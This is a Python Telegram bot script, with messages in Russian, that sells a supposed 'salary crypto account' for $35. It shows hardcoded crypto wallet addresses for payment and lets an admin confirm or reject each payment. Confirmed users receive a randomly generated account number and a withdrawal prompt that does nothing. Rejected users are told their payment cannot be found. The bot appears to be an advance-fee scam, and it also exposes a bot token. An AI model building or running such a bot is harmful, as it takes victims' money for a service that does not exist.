
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from random import randint

BOT_TOKEN = "8122510813:AAHOpgwNJqUWUhuo01Wl0FywRS40sBARhR0"
ADMIN_CHAT_ID = 7786764846
WALLETS = {
    "TRC20": "TQw19dGhSNeryY3eDX3byeD4KsThyNdCLU",
    "BEP20": "0x7a210fc89eccfaed2ea25cc27446e44743533ac2",
    "ERC20": "0x7a210fc89eccfaed2ea25cc27446e44743533ac2",
    "BTC": "1G7pG7WQwTvmmND9RgQFzkEQyuq9WAWeM3",
    "SOL": "3uUsgFUUUJLx5rYJ786rgcBozaxtFLvoSv1a2xvfbKrh"
}
OPENING_PRICE = 35
REDIRECT_URL = "https://forms.yandex.ru/u/65fc1552068ff006e9d03e05/"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, parse_mode="HTML")
dp = Dispatcher(bot)

users = {}

def generate_account_id():
    return f"BW-{randint(1000000000000000, 9999999999999999)}"

@dp.message_handler(commands=["start"])
async def start_handler(message: types.Message):
    users[message.from_user.id] = {"status": "new"}
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("🧾 Открыть зарплатный счёт — $35", callback_data="open")
    )
    await message.answer("Добро пожаловать! Нажмите, чтобы открыть зарплатный криптосчёт:", reply_markup=keyboard)

@dp.callback_query_handler(lambda c: c.data == "open")
async def open_wallet(callback: types.CallbackQuery):
    keyboard = InlineKeyboardMarkup(row_width=2)
    for net in WALLETS:
        keyboard.insert(InlineKeyboardButton(net, callback_data=f"network:{net}"))
    await callback.message.edit_text("Выберите сеть для оплаты:", reply_markup=keyboard)

@dp.callback_query_handler(lambda c: c.data.startswith("network:"))
async def show_wallet(callback: types.CallbackQuery):
    net = callback.data.split(":")[1]
    wallet = WALLETS[net]
    users[callback.from_user.id] = {"status": "awaiting_payment", "network": net}
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("✅ Я оплатил", callback_data="paid")
    )
    await callback.message.edit_text(
        f"💰 Отправьте <b>${OPENING_PRICE}</b> на адрес в сети <b>{net}</b>:
<code>{wallet}</code>

После отправки нажмите кнопку ниже.",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == "paid")
async def paid(callback: types.CallbackQuery):
    user = callback.from_user
    data = users.get(user.id, {})
    if data.get("status") != "awaiting_payment":
        return await callback.answer("Сначала выберите сеть и отправьте платёж.")
    network = data.get("network", "неизвестно")
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("✅ Подтвердить", callback_data=f"confirm:{user.id}"),
        InlineKeyboardButton("❌ Отклонить", callback_data=f"cancel:{user.id}")
    )
    await bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f"💸 Новый запрос на открытие счёта

👤 @{user.username or user.id}
Сеть: {network}

Подтвердить платёж?",
        reply_markup=keyboard
    )
    await callback.message.edit_text("⏳ Ожидаем подтверждение администратора...")

@dp.callback_query_handler(lambda c: c.data.startswith("confirm:"))
async def confirm(callback: types.CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    acc_id = generate_account_id()
    users[user_id]["account_id"] = acc_id
    users[user_id]["balance"] = 0
    users[user_id]["status"] = "active"
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("💸 Вывести средства", callback_data="withdraw")
    )
    await bot.send_message(
        chat_id=user_id,
        text=f"✅ Ваш зарплатный счёт открыт!
Номер счёта: <code>{acc_id}</code>
Баланс: $0.00",
        reply_markup=keyboard
    )
    await callback.message.edit_text("✅ Счёт подтверждён")

@dp.callback_query_handler(lambda c: c.data.startswith("cancel:"))
async def cancel(callback: types.CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    await bot.send_message(
        chat_id=user_id,
        text="❌ Обратитесь в техподдержку. К сожалению, не удаётся обнаружить ваш платёж. Напишите, пожалуйста, в Telegram: @secondlang_support"
    )
    await callback.message.edit_text("⛔️ Отклонено")

@dp.callback_query_handler(lambda c: c.data == "withdraw")
async def withdraw(callback: types.CallbackQuery):
    await callback.message.answer("💸 Введите сумму и способ вывода:
Пример:
<code>100 USDT на карту ****1234</code>")

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
